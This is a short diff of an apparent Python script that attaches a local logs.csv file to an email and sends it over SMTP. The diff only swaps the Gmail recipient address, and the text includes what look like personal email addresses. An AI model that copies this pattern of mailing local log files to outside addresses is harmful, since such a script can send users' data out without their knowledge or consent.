@@ -19,7 +19,7 @@ with open(os.path.join(os.getcwd(),'Scripts','logs.csv')) as attachment:
 
 # Email header
 message['From'] = "Malike Ashtar hasanali242424@gmail.com"
-message['To'] = "hasanali50923@gmail.com"
+message['To'] = "ansarijunaid886@gmail.com"
 message['Subject'] = "Python Alias Changed - SMTP Module "
 
 # Smtp server
